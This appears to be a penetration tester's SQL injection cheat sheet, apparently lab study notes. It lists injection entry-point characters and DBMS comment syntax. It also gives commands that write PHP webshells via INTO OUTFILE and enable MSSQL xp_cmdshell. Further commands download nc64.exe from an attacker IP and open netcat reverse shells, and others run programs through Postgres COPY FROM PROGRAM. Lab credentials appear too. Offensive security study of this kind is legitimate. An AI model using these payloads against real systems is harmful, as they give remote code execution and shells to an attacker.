# Description

SQL injection (SQLi) is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.

## Identify Where SQL Injection Can Be Performed

There are many places where SQLi can be performed. For example,

- URL parameters
- POST parameters
- HTTP request headers (Cookie, User-Agent, etc.)

# Command Syntax

## Entry Point Detection

```sql
'
%27
%2527

"
%22
%2522

`
%60
%2560

#
%23
%2523

;
%3B
%253B

)
%29
%2529

')
%27%29
%2527%2529

")
%22%29
%2522%2529
```

## Comment Syntax

Comment syntax is depending on the database used in the website.

|DBMS|Comments|
|---|---|
|MySQL|`-- -` (add a space after `--`)|
||`#`|
||`/*comment*/`|
||`/*!comment*/`|
|MSSQL|`--`|
||`/*comment*/`|
|Oracle|`--`|
|PostgreSQL|`--`|
||`/*comment*/`|
|SQLite|`--`|
||`/*comment*/`|

```bash
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' 

' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

💡 We can find webshell location to upload in phpinfo (.php) DOCUMENT_ROOT

## xp_cmdshell

```bash
netexec mssql 10.10.137.148 -u sql_svc -p Dolphin1

impacket-mssqlclient svc_mssql:'Service1'@240.0.0.1 -windows-auth


# Option from Nagoya

enable_xp_cmdshell

xp_cmdshell whoami

# Classic from the Course

EXECUTE sp_configure 'show advanced options', 1;

RECONFIGURE;

EXECUTE sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';

EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';
```

## Postgres RCE

```bash
psql -h 240.0.0.1 -p 5432 -U postgres -d webapp

DROP TABLE IF EXISTS cmd_exec;

CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

SELECT * FROM cmd_exec;

DROP TABLE IF EXISTS cmd_exec;
```

## Reverse Shell

```bash
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f';
```

## Bypass Auth

SecLists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt at master · danielmiessler/SecLists

# Common Flags / Options

-flag: Description of what this flag does

# Use Cases

When there's an input on the website that is being tested.

# Examples

Practical example from a lab machine or HTB.

```sh
example-command -flag target
```

# Related Notes

[[Link to a related atomic note]]

[MOC - Initial Access](../../0%20-%20MOCs/MOC%20-%20Initial%20Access.md)

# References

https://exploit-notes.hdks.org/exploit/web/sql-injection-cheat-sheet/

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection